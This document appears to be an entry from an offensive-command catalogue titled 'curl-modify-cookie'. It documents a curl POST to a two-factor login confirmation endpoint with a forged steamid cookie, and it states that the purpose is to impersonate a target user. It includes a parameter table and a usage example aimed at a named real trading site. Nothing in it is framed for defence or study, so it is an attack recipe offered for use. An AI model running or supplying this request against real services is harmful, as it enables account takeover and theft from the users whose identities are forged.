---
data: >-
  curl -X POST https://target.com/login/confirm -H "Cookie:
  steamid=victim_steamid" -d '{"token":"session_token","code":"123456"}'
tags:
  - http
  - cookie
  - modification
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:48.335Z'
id: 4a0865f6-ecd7-4860-831b-d6e85fb40ed8
verified: false
validated: true
submitted: true
---
# curl-modify-cookie

## Command

```bash
curl -X POST https://target.com/login/confirm -H "Cookie: steamid=victim_steamid" -d '{"token":"session_token","code":"123456"}'
```

## Description

Executes a POST to 2FA endpoint with modified steamid cookie to impersonate a target user.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Cookie: steamid=..."` | Modified victim SteamID | Yes |
| `-d '{...}'` | Request body | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://csmoney.com/login/confirm -H "Cookie: steamid=76561198000000000" -d '{"token":"abc","code":"654321"}'
```

### Advanced Usage

Add verbose: ```bash
curl -v -X POST ... ``` for debugging.

## Expected Output

Server response indicating processing for the victim's account.

## Related

- [[commands/curl-trigger-lockout]]
